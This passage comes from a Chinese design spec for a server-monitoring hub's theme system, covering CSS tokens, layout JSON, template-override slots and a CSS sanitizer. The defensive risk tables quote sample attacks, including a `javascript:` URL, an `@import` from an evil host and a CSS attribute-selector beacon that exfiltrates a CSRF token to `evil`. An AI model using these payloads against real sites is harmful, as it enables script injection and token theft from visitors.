| `--kokoro-card-padding` | length | `16px` | 卡片内边距 |
| `--kokoro-z-dropdown` | number | `1000` | 下拉层级 |
| `--kokoro-z-modal` | number | `1100` | 弹窗层级 |
| `--kokoro-z-toast` | number | `1200` | 通知层级 |

#### L. 状态色 `status`（与业务语义绑定，独立于品牌色）

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-status-online` | color | `#1a7f37` | 在线 |
| `--kokoro-status-offline` | color | `#8c959f` | 离线 |
| `--kokoro-status-idle` | color | `#bf6a02` | 空闲/低活 |
| `--kokoro-status-maintenance` | color | `#0969da` | 维护中 |

#### M. 装饰 `decor`（唯一允许出现图像资源的 token 组）

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-bg-image` | url-token | `none` | 页面背景图，值由 Hub 从 `decor.bg-image` 路径重写为 `url("/_theme-assets/...")` |
| `--kokoro-bg-size` | length/keyword | `auto` | |
| `--kokoro-bg-repeat` | keyword | `repeat` | |
| `--kokoro-bg-attachment` | keyword | `fixed` | |
| `--kokoro-hero-gradient` | gradient | `linear-gradient(135deg, var(--kokoro-color-primary), var(--kokoro-color-accent))` | Hero 渐变 |
| `--kokoro-hero-overlay` | color | `rgba(0,0,0,.35)` | Hero 图片上的遮罩 |
| `--kokoro-card-border-image` | keyword | `none` | 预留，渐变描边 |

#### N. 组件级微调（可选，未声明时由上面各组推导）

| 变量 | 类型 | 默认值 | 说明 |
|---|---|---|---|
| `--kokoro-card-bg` | color | `var(--kokoro-color-surface)` | 卡片背景单独指定 |
| `--kokoro-card-border` | color | `var(--kokoro-color-border)` | |
| `--kokoro-header-bg` | color | `var(--kokoro-color-surface)` | 顶栏背景 |
| `--kokoro-header-fg` | color | `var(--kokoro-color-text)` | |
| `--kokoro-footer-bg` | color | `var(--kokoro-color-bg-subtle)` | |
| `--kokoro-code-bg` | color | `var(--kokoro-color-surface-sunken)` | |

### 3.3 深色模式

Hub 在 `<html>` 上输出 `data-k-mode`，取值 `light` / `dark`：

```
mode.default = "light" | "dark"   -> 直接输出该值
mode.default = "auto"             -> 服务端无法知道系统偏好，输出 light，
                                     同时注入一段内联脚本（nonce）在 <head> 首行同步执行：
                                     if (matchMedia('(prefers-color-scheme: dark)').matches)
                                       document.documentElement.dataset.kMode='dark';
                                     避免闪白。用户手动切换后写 cookie k_mode，SSR 直接读 cookie 输出。
```

tokens 注入结果示例：

```css
:root{
  --kokoro-color-bg:#ffffff;
  --kokoro-color-text:#1f2328;
  --kokoro-chart-grid:#eaeef2;
  /* ... 其余变量 ... */
}
[data-k-mode="dark"]{
  --kokoro-color-bg:#0d1117;
  --kokoro-color-surface:#161b22;
  --kokoro-color-text:#e6edf3;
  --kokoro-chart-grid:#21262d;
  /* 只输出 tokensDark 里声明过的键；未声明的键沿用 :root 的值 */
}
```

`tokensDark` 是**稀疏覆盖**：只写需要变的键，减少作者工作量，也便于 Hub 自动迁移。

### 3.4 内置默认主题如何定义变量

内置主题与第三方主题走**完全相同的代码路径**，不搞特例：

```
internal/theme/builtin/
  ├── daylight/theme.json     (go:embed)
  ├── midnight/theme.json
  ├── terminal/theme.json
  ├── paper/theme.json
  └── neon/theme.json
```

- 每个内置主题就是一份标准 `theme.json`（`id` 前缀 `kokoro.`），编译期随 `go:embed` 进二进制。
- Hub 启动时把它们当作"只读的已安装主题"注册进主题注册表，`enabled=true`，`source="builtin"`。
- 渲染时统一走 `theme.Resolve(activeID)` → `RenderTokens()` → `<style id="kokoro-tokens">`。
- 好处：内置主题改一个变量不需要改 Go 代码；官方主题的正确性被同一套校验器保证；用户"复制内置主题为副本再改"就是天然的工作流。

注入顺序（每个页面 `<head>` 内，全部带 CSP nonce）：

```
1. <link rel="stylesheet" href="/_static/base.css?v=<hubVersion>">   Hub 基础样式（唯一的全量 CSS）
2. <style id="kokoro-tokens" nonce="...">                           变量（light + dark）
3. <style id="kokoro-layout" nonce="...">                           由 layout JSON 生成的少量布局 CSS
4. <link rel="stylesheet" href="/_theme-assets/<id>/<v>/css/custom.css">  主题附加样式（已消毒）
5. 主题字体：@font-face 由 Hub 依据 assets 中的字体文件生成，src 只指向 /_theme-assets/
```

第 3 步是第二层的落地方式，见下。

### 3.5 第二层：layout（用 JSON 调配页面结构）

#### 3.5.1 顶层结构

```
layout.shell      整站骨架：内容宽度、顶栏、侧边栏、导航项、页脚
layout.home       首页：Hero 区 + 列表区
layout.detail     详情页（/n/<slug>）：头部样式 + 板块编排
layout.charts     图表通用参数（首页迷你图与详情页大图共用）
layout.misc       零碎风格开关（状态点、标签、数字格式…）
```

#### 3.5.2 `shell`

| 键 | 类型 | 默认 | 取值 / 说明 |
|---|---|---|---|
| `contentMaxWidth` | length | `1280px` | 也接受 `none`（全宽） |
| `contentAlign` | enum | `center` | `left` / `center` |
| `header.enabled` | bool | `true` | |
| `header.variant` | enum | `solid` | `solid` / `transparent` / `blur` / `bordered` |
| `header.sticky` | bool | `true` | 生成 `data-k-header-sticky="1"` |
| `header.height` | length | `var(--kokoro-header-height)` | |
| `header.showSearch` | bool | `true` | |
| `header.showModeSwitch` | bool | `true` | 深浅色切换按钮 |
| `sidebar.enabled` | bool | `false` | |
| `sidebar.position` | enum | `left` | `left` / `right` |
| `sidebar.width` | length | `var(--kokoro-sidebar-width)` | |
| `sidebar.collapsible` | bool | `true` | |
| `sidebar.defaultCollapsed` | bool | `false` | |
| `sidebar.sticky` | bool | `true` | |
| `nav.items[]` | array | 见示例 | `{id,label,href,icon,order,visible}`；`icon` 取 Hub 内置图标名（`grid` `server` `globe` `book` `palette` `chart` `settings`）或包内 `assets/icons/*.svg` 路径；最多 12 项 |
| `footer.enabled` | bool | `true` | |
| `footer.variant` | enum | `simple` | `simple` / `columns` / `minimal` |
| `footer.showVersion` | bool | `true` | |
| `footer.text` | string | `""` | 纯文本，HTML 会被转义 |
| `footer.columns[]` | array | `[]` | `{title, links:[{label,href}]}`，最多 4 列 × 8 链接 |

#### 3.5.3 `home.hero`

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `enabled` | bool | `false` | |
| `variant` | enum | `plain` | `plain` / `gradient` / `image` / `split` |
| `align` | enum | `center` | `left` / `center` |
| `height` | length | `32vh` | |
| `minHeight` | length | `200px` | |
| `title` / `subtitle` | string | `""` | 纯文本，转义后输出 |
| `background.type` | enum | `none` | `none` / `solid` / `gradient` / `image` |
| `background.value` | color/gradient | `""` | `type!=image` 时使用，值写进内联 style，走颜色白名单校验 |
| `background.image` | string | `""` | 包内资源路径，Hub 重写 URL |
| `background.overlay` | color | `rgba(0,0,0,.35)` | |
| `background.blur` | length | `0px` | 背景图模糊（用 `filter: blur()` 生成，非 CSS 变量） |
| `showStats` | bool | `true` | |
| `stats[]` | array | `[]` | `{key,label}`；key ∈ `total` `online` `offline` `avgLoad` `totalTraffic` `regions` |
| `cta[]` | array | `[]` | `{label,href,style}`；style ∈ `primary` `accent` `ghost`；最多 2 个 |

#### 3.5.4 `home.list`（首页/列表页四种模式）

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `mode` | enum | `card` | **`card` / `table` / `compact` / `map`** |
| `allowUserSwitch` | bool | `true` | 访客能否在页面右上角切换模式（存 cookie `k_list_mode`） |
| `availableModes` | enum[] | 全部四种 | 主题可只暴露子集 |
| `defaultSort` | object | `{by:"name",order:"asc"}` | `by` ∈ `name` `status` `load` `cpu` `mem` `region` `created` `uptime` |
| `groupBy` | enum | `none` | `none` / `status` / `region` / `tag` / `provider` |
| `showFilterBar` | bool | `true` | |
| `filterFields` | enum[] | `["status","region"]` | 可含 `status` `region` `tag` `provider` `keyword` |
| `emptyState` | object | 内置文案 | `{title,text,icon}` |
| `card.*` | object | 见下 | `mode=card` 生效 |
| `table.*` | object | 见下 | `mode=table` 生效 |
| `compact.*` | object | 见下 | `mode=compact` 生效 |
| `map.*` | object | 见下 | `mode=map` 生效 |

`card`：

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `minWidth` | length | `300px` | `grid-template-columns: repeat(auto-fill, minmax(300px, 1fr))` |
| `maxWidth` | length | `1fr` | |
| `gap` | length | `var(--kokoro-space-5)` | |
| `aspect` | ratio | `16 / 9` | 封面比例；`0` 表示无封面 |
| `align` | enum | `left` | `left` / `center` |
| `border` | bool | `true` | |
| `shadow` | enum | `sm` | `none` / `sm` / `md` / `lg` / `glow`（hover 时升一级） |
| `hoverLift` | bool | `true` | hover 上浮 2px |
| `coverFit` | enum | `cover` | `cover` / `contain` |
| `fields` | enum[] | 见示例 | 可选：`cover` `flag` `name` `status` `location` `os` `cpu` `mem` `disk` `net` `uptime` `tags` `sparkline` `price` `ip` |
| `sparkline` | object | `{enabled:true,metric:"cpu",range:"1h",height:"32px"}` | `metric` ∈ `cpu` `mem` `disk` `net` `load`；`range` 复用 `charts.ranges` 的 key |

`table`：

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `density` | enum | `compact` | `compact` / `comfortable` |
| `striped` | bool | `true` | |
| `rowHover` | bool | `true` | |
| `stickyHeader` | bool | `true` | |
| `showUnit` | bool | `true` | 百分比是否带 `%` |
| `columns` | enum[] | 见示例 | `name` `status` `location` `os` `cpu` `mem` `disk` `net` `uptime` `load` `tags` `price` `lastSeen` |

`compact`：

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `rowHeight` | length | `44px` | |
| `dividers` | bool | `true` | 行间分隔线 |
| `showFlag` | bool | `true` | |
| `inlineBars` | bool | `true` | CPU/内存用细横条替代数字 |
| `fields` | enum[] | 见示例 | 同 `card.fields` 子集，单行排布 |

`map`：

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `groupBy` | enum | `region` | `region` / `country` / `provider` |
| `showLabels` | bool | `true` | |
| `colorBy` | enum | `load` | `load` / `count` / `status` |
| `emptyRegion` | enum | `hide` | `hide` / `show` |
| `projection` | enum | `equirectangular` | `equirectangular` / `mercator`（内置极简 SVG 世界地图，不上外部地图库） |
| `height` | length | `420px` | |

> `map` 模式下每台机器仍是可点击条目，地图只是分组容器 + 区域着色，不做真实地理打点（避免合规与数据精度问题）。

#### 3.5.5 `detail`（每台机器的主页 `/n/<slug>`）

`detail.header`：

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `variant` | enum | `hero` | **`hero`（大图头图） / `compact`（紧凑条） / `none`** |
| `height` | length | `320px` | 仅 `hero` 生效 |
| `align` | enum | `left` | |
| `showStatusBadge` | bool | `true` | |
| `showFlag` | bool | `true` | |
| `showTags` | bool | `true` | |
| `overlay` | color | `var(--kokoro-hero-overlay)` | 图片上的遮罩 |
| `background` | object | 同 Hero | `{type,value,image,blur}` |
| `primaryLine` | enum | `name` | `name` / `location` / `custom`（`custom` 取 node 的 display name） |
| `secondaryLine` | enum | `location` | `location` / `specs` / `uptime` / `none` |

`detail.sections[]`（**板块编排，拖拽的直接数据源**）：

| 键 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `id` | string | ✅ | 稳定标识，同 `type` |
| `type` | enum | ✅ | `metrics` `intro` `gallery` `comments` `commerce` `specs` `benchmark` `neighbors` |
| `title` | string | ✅ | 板块标题，可空串（不显示标题栏） |
| `visible` | bool | ✅ | 显隐开关 |
| `span` | enum | ✅ | `full` / `half` / `third` / `sidebar` |
| `locked` | bool | ❌ | `true` 时 UI 禁止拖动/隐藏（如合规要求必须展示的模块） |
| `options` | object | ❌ | 板块私有参数，见下表 |

`options` 白名单：

| type | options 键 |
|---|---|
| `metrics` | `{height, ranges[], defaultRange, metrics[], grid, legend}` |
| `intro` | `{toc, maxWidth, fontSize}` |
| `gallery` | `{columns(1-4), aspect, lightbox}` |
| `comments` | `{perPage(5-50), order(newest/oldest), collapsed}` |
| `commerce` | `{buttonLabel, showContactTypes[], requireLogin}` |
| `specs` | `{fields[], layout(table/list)}` |
| `benchmark` | `{items[], showDate}` |
| `neighbors` | `{count, source(friends/directory)}` |

`detail` 其他键：

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `sectionGap` | length | `var(--kokoro-space-6)` | |
| `sidebarPosition` | enum | `right` | 仅当存在 `span:"sidebar"` 板块时生效 |
| `stickySidebar` | bool | `true` | |

#### 3.5.6 `charts`

| 键 | 类型 | 默认 | 说明 |
|---|---|---|---|
| `type` | enum | `area` | **`line` / `area` / `bar`** |
| `types` | enum[] | `["line","area","bar"]` | 允许切换的类型 |
| `typeAllowUserSwitch` | bool | `true` | |
| `defaultRange` | string | `6h` | 必须在 `ranges[].key` 中 |
| `ranges[]` | array | 见示例 | `{key,label,points}`；key ∈ `15m` `1h` `6h` `24h` `7d` `30d` `90d`；`points` ≤ 240（服务端下采样） |
| `grid` | bool | `true` | 是否画网格线 |
| `legend` | bool | `true` | 是否显示图例 |
| `axisLabel` | bool | `true` | 坐标轴刻度文字 |
| `stack` | bool | `false` | 面积/柱状是否堆叠 |
| `smooth` | bool | `true` | 折线平滑（Catmull-Rom → 三次贝塞尔，服务端生成） |
| `tooltip` | enum | `axis` | `axis` / `item` / `none` |
| `height` | length | `200px` | 列表页迷你图 |
| `heightDetail` | length | `300px` | 详情页大图 |
| `animationMs` | number | `200` | SVG `stroke-dasharray` 入场动画 |

> 图表实现：**服务端用 Go 直接生成 SVG**（不引图表库）。HTMX 负责切换：`hx-get="/n/<slug>/chart.svg?range=6h&type=area&m=cpu,mem,net"` → 返回 `<svg>` 片段 → `hx-swap="outerHTML"`。主题只控制颜色/线宽/网格/图例/平滑/高度，所有绘制逻辑在 Hub 里，主题无法注入图形内容。这既省掉前端依赖，也把图表的攻击面压到零。

#### 3.5.7 `misc`

| 键 | 类型 | 默认 | 取值 |
|---|---|---|---|
| `statusDotStyle` | enum | `solid` | `solid` / `ring` / `glow` / `none` |
| `usageBarStyle` | enum | `solid` | `solid` / `gradient` / `segmented` / `none` |
| `tagStyle` | enum | `pill` | `pill` / `square` / `text` |
| `badgeStyle` | enum | `soft` | `soft` / `outline` / `solid` |
| `showUptime` | bool | `true` | |
| `showRegionFlag` | bool | `true` | |
| `numberFormat` | enum | `si` | `si`（1.2K）/ `plain` / `percent` |
| `dateFormat` | enum | `relative` | `relative`（3 分钟前）/ `absolute` |

### 3.6 layout → DOM 的映射（实现者照此写代码）

Hub 渲染时把 layout 展开成 `<body>` 上的 data 属性与容器上的 data 属性，内置 CSS 里预置全部规则：

| layout 键 | 输出 | 内置 CSS 选择器样例 |
|---|---|---|
| `home.list.mode` | `<body data-k-list-mode="card">` | `[data-k-list-mode="card"] #k-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(var(--k-card-min),1fr));gap:var(--k-card-gap)}` |
| `home.list.mode=table` | 同上值为 `table` | `[data-k-list-mode="table"] #k-list .k-card{display:grid;grid-template-columns:var(--k-table-cols)}` |
| `home.list.mode=compact` | 值为 `compact` | `[data-k-list-mode="compact"] .k-card{display:flex;height:var(--k-row-h);border:0;border-bottom:1px solid ...}` |
| `home.list.mode=map` | 值为 `map` | `[data-k-list-mode="map"] #k-list{display:none}` + 渲染 `#k-map` 分组容器 |
| `shell.sidebar.position` | `<body data-k-sidebar="left">` | `[data-k-sidebar="left"] #k-shell{grid-template-columns:var(--kokoro-sidebar-width) 1fr}` |
| `shell.header.variant` | `<header data-k-header="blur">` | `[data-k-header="blur"]{backdrop-filter:blur(var(--kokoro-backdrop-blur));background:color-mix(...)}` |
| `home.hero.variant` | `<section data-k-hero="gradient">` | `[data-k-hero="gradient"]{background-image:var(--kokoro-hero-gradient)}` |
| `detail.header.variant` | `<div data-k-detail-header="hero">` | `[data-k-detail-header="hero"]{min-height:var(--k-detail-header-h)}` / `="compact"` 时 `min-height:0;padding:var(--kokoro-space-4)` |
| `detail.sections[].span` | `<section data-k-span="full">` | `[data-k-span="sidebar"]{position:sticky;top:calc(var(--kokoro-header-height) + 16px)}` |
| `detail.sections[].visible=false` | 不渲染该 `<section>` | — |
| `charts.grid` | `<svg data-k-chart-grid="1">`（服务端绘制时决定是否画 grid 线） | — |
| `charts.legend` | 同上 `data-k-chart-legend="1"` | 服务端决定是否输出图例 `<g>` |
| `misc.tagStyle` | `<body data-k-tags="pill">` | `[data-k-tags="pill"] .k-tag{border-radius:var(--kokoro-radius-full)}` |
| `misc.statusDotStyle` | `<body data-k-dot="glow">` | `[data-k-dot="glow"] .k-dot{box-shadow:0 0 8px currentColor}` |

少量必须参数化的长度（卡片最小宽度、行高、列数、Hero 高度、图表高度）由 Hub 生成到 `<style id="kokoro-layout">` 里，且**只允许写进 `--k-*` 私有前缀变量**（与 `--kokoro-*` 主题变量区分开，主题无法覆盖 `--k-*`，避免循环依赖）：

```css
:root{
  --k-card-min:320px;
  --k-card-gap:24px;
  --k-row-h:46px;
  --k-table-cols:minmax(160px,2fr) 90px 110px 70px 70px 70px 120px 90px;
  --k-hero-h:38vh;
  --k-hero-min:260px;
  --k-detail-header-h:340px;
  --k-chart-h:220px;
  --k-chart-h-detail:320px;
  --k-gallery-cols:3;
}
```

生成规则：所有来自 layout 的 length 值必须先过一遍"CSS 长度校验器"（正则 `^(-?\d+(\.\d+)?(px|rem|em|vh|vw|%|ch|fr)?|auto|none|0|var\(--kokoro-[a-z0-9-]+\))$`），非法值回退默认。

### 3.7 用户级覆盖与拖拽编排

主题的 layout 是**默认值**，管理员可以在 UI 上改，改动存用户覆盖，不修改主题包本身（保证主题可升级、可导出原味版本）。

存储：`data/layout-overrides.json`

```json
{
  "version": 1,
  "etag": "\"a3f1c2\"",
  "themeId": "neon-dream",
  "patches": {
    "home.list.mode": "compact",
    "detail.header.variant": "compact",
    "detail.sections": [
      { "id": "metrics", "type": "metrics", "title": "实时负载", "visible": true, "span": "full" },
      { "id": "commerce", "type": "commerce", "title": "交易意向", "visible": true, "span": "sidebar" },
      { "id": "intro", "type": "intro", "title": "机器介绍", "visible": true, "span": "full" },
      { "id": "gallery", "type": "gallery", "title": "相册", "visible": false, "span": "full" },
      { "id": "comments", "type": "comments", "title": "留言", "visible": true, "span": "full" }
    ]
  }
}
```

生效顺序：`内置默认 layout` → `主题 layout` → `用户 patches`（浅合并，数组整体替换）。

拖拽实现（原生 HTML5 DnD，不引库）：

```html
<section id="k-sections" data-k-sections='["metrics","intro","gallery","comments","commerce"]'>
  <div class="k-section" draggable="true" data-k-section="metrics"> ... </div>
  ...
</section>
<script nonce="...">
  // ~60 行原生 JS：dragstart 记 index / dragover preventDefault + 插入占位 / drop 重排 DOM
  // drop 后：fetch(PATCH /api/v1/themes/active/layout, {body: JSON.stringify({path:"detail.sections", value: order})})
  // 请求头带 X-CSRF-Token；服务端校验 path 白名单（只允许 "home.list.mode" "detail.header.variant"
  // "detail.sections" "charts.type" "charts.defaultRange"），其余 path 一律 400
</script>
```

- 顺序写入使用乐观锁：`If-Match: "a3f1c2"`，冲突返回 409 + 当前值，前端提示刷新。
- 显隐开关是一个 `<input type="checkbox" hx-patch="/api/v1/themes/active/layout" hx-vals='{"path":"detail.sections"}'>`（HTMX 内联属性，无需额外 JS）。
- "恢复主题默认"按钮 = `DELETE /api/v1/themes/active/layout?path=detail.sections`。
- 访客侧的列表模式切换走 cookie，不写用户覆盖（避免匿名请求写盘）。

---

## 4. 第三层：模板覆盖（高级模式，默认关闭）

### 4.1 插槽白名单

Hub 在代码里维护一张表，只有表里的 slot 可被覆盖：

```go
type SlotSpec struct {
    Name        string   // 文件名（不含 .tmpl），也是 manifest.overrides[].slot 的值
    Since       string   // 引入该 slot 的 Hub 版本，用于兼容判断
    Description string
    Data        any      // 冻结 DTO 的零值，用于启动期反射检查
    MaxBytes    int      // 渲染输出上限
}

var Slots = map[string]SlotSpec{
    "slot-hero":             {"slot-hero", "1.4.0", "首页 Hero 区",             dto.Hero{},             32<<10},
    "slot-server-card":      {"slot-server-card", "1.4.0", "列表页单张卡片",      dto.ServerCard{},       16<<10},
    "slot-server-row":       {"slot-server-row", "1.4.0", "紧凑/表格模式单行",    dto.ServerRow{},         8<<10},
    "slot-detail-header":    {"slot-detail-header", "1.4.0", "详情页头部",        dto.NodeHeader{},       32<<10},
    "slot-detail-metrics":   {"slot-detail-metrics", "1.4.0", "详情页图表容器",   dto.MetricsBlock{},     32<<10},
    "slot-comment-item":     {"slot-comment-item", "1.5.0", "单条评论",           dto.Comment{},           8<<10},
    "slot-footer":           {"slot-footer", "1.4.0", "页脚",                     dto.Footer{},           16<<10},
    "slot-empty-state":      {"slot-empty-state", "1.4.0", "空状态",              dto.EmptyState{},        8<<10},
    "slot-nav-extra":        {"slot-nav-extra", "1.4.0", "导航末尾追加区",        dto.NavExtra{},          8<<10},
}
```

界定原则：

1. **只开放"展示片段"，不开放"整页"**。整页（`base.tmpl` / `layout.tmpl`）永远不可覆盖——否则主题就能顺走所有数据、绕过 CSP、改掉 CSRF 表单。
2. **只开放叶子节点**。一个 slot 的渲染结果必须是一段可独立存在的 HTML 片段，不依赖外层变量。
3. **slot 名即契约**。Hub 只能在**大版本**移除 slot；小版本只增不改语义。移除前先标 `Deprecated: "<version>"` 并保留两个小版本。
4. 白名单通过 `GET /api/v1/themes/slots` 暴露给主题作者，返回每个 slot 的名字、DTO 字段表、内置源码（便于照抄改）。

### 4.2 模板注入：风险点到底在哪

Go `html/template` 不是沙箱，风险面具体有这些：

| 风险 | 机理 | 对策 |
|---|---|---|
| **数据越权读取** | 模板可以写 `{{.Node.Token}}`、`{{.User.Email}}`；只要传入的对象图里有，就能输出 | 只传**冻结 DTO**（见 4.3），DTO 只含展示字段，绝不含 token / 密码 / IP / 邮箱 / 内部 ID |
| **方法调用副作用** | `{{.Node.Restart}}`、`{{.DB.Close}}` — 模板里 `.Field` 若绑定到方法会被**调用** | DTO 类型树禁止任何导出方法（启动期反射断言）；禁止函数类型字段 |
| **FuncMap 越权** | 若 FuncMap 里有 `call` / `printf` / `html` / `js` / `url` / `safeHTML`，就能构造 `%v` 打印结构体、或绕过自动转义 | FuncMap 白名单，**不提供** `call`、`printf`、`html`、`js`、`url`、`attr`、`safeHTML`、`index`(限) 等；格式化需求用专用函数 `kNum` `kPct` `kBytes` `kDur` |
| **跨模板引用** | `{{template "base" .}}` 可以 include 内置模板，从而拿到整页上下文与未脱敏数据 | 覆盖模板中**禁止任何 `{{template}}` / `{{block}}` / `{{define}}` 节点**（AST 静态检查，见 4.4） |
| **自动转义被绕过** | 主题写 `<a href="{{.Href}}">` 时 html/template 会按 URL 上下文转义，这是安全的；真正危险的是 FuncMap 返回 `template.HTML` | FuncMap 所有函数返回值类型限定为 `string` / `int` / `bool`，不允许返回 `template.HTML` / `template.URL` / `template.JS` |
| **渲染炸弹** | `{{range .Items}}` 循环百万次、`{{template}}` 自递归 → CPU/内存打满，整站不可用 | 输出字节上限（每 slot 8-32KiB）+ 渲染耗时上限（500ms，用带限流的 writer 提前返回 error 打断执行） |
| **错误信息泄露** | 模板报错可能把内部类型名/路径打进页面 | 渲染失败只打日志，页面回退内置 slot，不输出任何错误细节 |
| **升级后契约漂移** | Hub 1.6 改了 DTO 字段名，主题引用了废弃字段 → 渲染报错/白屏 | DTO 字段只增不删；删除前标记两版 deprecated；渲染前用 slot 的 `Since` + Hub 版本做兼容提示；渲染失败自动回退 |

### 4.3 冻结 DTO

规则（启动期用 `reflect` 递归检查每个 slot 的 DTO 类型，不满足则 panic，保证不会被漏过）：

```
允许的基础类型：string, bool, int/int64/float64, time.Time(只通过其 String 方法输出? 不允许 -> 用预格式化 string)
允许的组合：[]T、map[string]string、map[string]T，T 递归满足本规则
禁止：func 类型字段、chan、指针指向非白名单类型、interface{} 字段、任何带导出方法的类型（除基础类型本身）
禁止：字段名含 Token/Secret/Password/Key/Email/IP/Contact 的字段（额外审计断言）
```

示例：

```go
type ServerCard struct {
    Name       string            // 机器名
    Status     string            // "online" | "offline" ...
    StatusText string            // "在线"
    Region     string            // "香港"
    Flag       string            // "HK"（由 Hub 渲染成内置国旗组件，不传 emoji）
    OS         string
    CPUPct     int               // 0-100
    MemPct     int
    DiskPct    int
    NetText    string            // "12.4 MB/s"
    UptimeText string            // "23 天"
    Tags       []string
    URL        string            // "/n/<slug>"，站内相对路径
    Sparkline  string            // 已渲染好的 SVG 字符串？-> 见下
}
```

> `Sparkline` 这类预渲染 HTML **不能直接给模板**（否则等于开了 safeHTML）。做法：Hub 把迷你图作为**独立的 HTTP 资源** `/n/<slug>/spark.svg?metric=cpu&range=1h`，模板里只能写：
> `<img src="{{.SparkURL}}" alt="" width="120" height="34">`
> `SparkURL` 是 string，html/template 按 URL 上下文转义，且 Hub 保证只生成站内路径。

### 4.4 静态 AST 检查（安装期一次性做）

解析后遍历 `*parse.Tree`，命中即拒绝整个包：

```
1. *parse.TemplateNode   -> 拒绝（{{template}} / {{block}}）
2. *parse.ListNode 递归；树深度 > 12 -> 拒绝
3. *parse.CallNode       -> 拒绝（{{func ...}} 与管道中的函数调用）
4. 标识符不在 FuncMap 白名单 -> 拒绝
5. *parse.IfNode / RangeNode / WithNode 允许；RangeNode 嵌套深度 > 3 -> 拒绝
6. *parse.TextNode 中出现 "<script" / "javascript:" / "on[a-z]+=" 字面量 -> 拒绝
7. FuncMap 白名单：
   and or not eq ne lt le gt ge len  upper lower trim title
   kNum kPct kBytes kDur kIcon kFlag kTimeAgo
   （全部返回 string/bool/int，无 template.HTML / URL / JS）
8. 总字节数 > 64KiB 的 .tmpl 文件 -> 拒绝
```

运行时额外加：

- 每个 slot 渲染使用 `context.WithTimeout(ctx, 500ms)` + `limitedWriter{max: MaxBytes}`；超限 writer 返回 `ErrTooLarge`，`Execute` 立即终止。
- 渲染出错 / 超时 / 超长 → **回退内置 slot**，记 `theme.slot_fallback_total{slot}` 指标，后台红点提示。

### 4.5 diff 展示

- Hub 保存内置 slot 源码（`go:embed` 的 `templates/slots/<name>.tmpl`）。
- 安装/启用时对 `(内置, 覆盖)` 做行级 unified diff（自研 LCS，约 150 行 Go；或 `github.com/hexops/gotextdiff`）。
- 产物存 `data/themes/<id>/<version>/diff/<slot>.patch`，UI 侧渲染成 `<pre>` + `<span class="k-add">` / `<span class="k-del">`，无需前端库。
- 启用流程强制：**逐个 slot 勾选确认**（不是"全部接受"一个按钮），弹窗显示：作者、reason、diff 行数、会访问哪些 DTO 字段（由 DTO 类型反射列出）。
- 每次 Hub 升级后，若内置 slot 源码发生变化，重新生成 diff 并要求管理员**重新确认一次**，否则自动停用该 slot（防"升级后悄悄变了"）。

### 4.6 默认关还是默认开：**默认关闭**

理由（四条，按权重排序）：

1. **自托管场景没有运维值守**。Kokoro 的目标机器是 1C1G 小鸡、站长是个人。模板覆盖一旦因 Hub 升级/DTO 漂移而报错，就是公开页面白屏，站长可能几小时才发现。tokens + layout 两层已经覆盖 95% 的"可玩性"，不值得为剩下 5% 让所有人承担白屏风险。
2. **它是唯一有"代码执行面"的一层**。前两层是数据（纯声明式），可以被静态校验到接近零风险；模板是**可执行逻辑**，即使做了 FuncMap 白名单与 DTO 冻结，审计成本也是前两层的数量级倍。
3. **它是唯一会随 Hub 版本腐化的一层**。tokens 有别名迁移，layout 有未知键忽略；模板引用的是 DTO 字段名，腐化是硬失败。
4. **它决定了支持成本**。用户报 bug 时，前三秒要确认是不是主题模板引起的，默认关闭能让绝大多数 issue 直接排除这一层。

开启条件（全部满足）：

```
1. 配置文件 theme.allowTemplateOverrides = true（默认 false）
2. 主题已签名（官方 key 或已信任的社区 key）；未签名主题即使开了开关也不加载 overrides
3. 管理员对每个 slot 单独确认 + 看过 diff
4. 每次 Hub 升级后重新确认
```

逃生通道（任何一层出问题都能用）：

- URL 参数 `?k_safe=1` → 本次请求忽略主题，只用内置 `kokoro.daylight` + 默认 layout。
- CLI：`kokoro serve --theme=builtin:kokoro.daylight`。
- 后台永远保留"恢复默认皮肤"按钮，且不需要主题能正常工作。

---

## 5. 安全沙箱

主题是**对访客生效**的（不只是管理员自己看到），所以以下每条都是对外的攻击面。

### 5.1 CSS 注入

消毒器 `internal/theme/csssanitize` 在**安装期**运行一次，产物是消毒后的 CSS 文本存盘，运行时不再解析。流程：词法扫描 → 规则过滤 → URL 重写 → 结果缓存。

| 风险 | 样例 | 对策 |
|---|---|---|
| `javascript:` URL | `background:url("javascript:alert(1)")` | `url()` 的 scheme 白名单：**只允许相对路径、站点内绝对路径、`https:`（且主机在 `theme.assetHostAllowlist`，默认空）**。禁止 `javascript:` `data:` `vbscript:` `blob:` `file:` `ftp:` |
| `@import` 外链 | `@import url("https://evil/x.css")` | **默认禁止一切 `@import`**（包括相对路径）。需要拆分的作者把多个文件写进 `css[]` 数组，由 Hub 按顺序拼 |
| 字体外链 | `@font-face{src:url("https://fonts.gstatic.com/...")}` | 同上：`url()` 白名单生效；另外**主题 CSS 中禁止出现 `@font-face`**，字体由 `assets/fonts/` 中的文件经 Hub 生成 `@font-face`（`src` 只指向 `/_theme-assets/...`，`font-display:swap`）。杜绝字体 CDN 的隐私泄露与可用性依赖 |
| 数据外泄（attribute selector beacon） | `input[name="csrf"][value^="a"]{background:url(https://evil/?a)}` | 两条同时上：① `url()` 外链默认全禁（beacon 无处可发）；② **属性选择器白名单**：只允许 `class` `id` `type` `disabled` `checked` `aria-*` `data-k-*` `data-status` `data-region`；含其他属性名（尤其是 `value` `name` `href` `src` `content`）的选择器直接丢弃该规则并告警 |
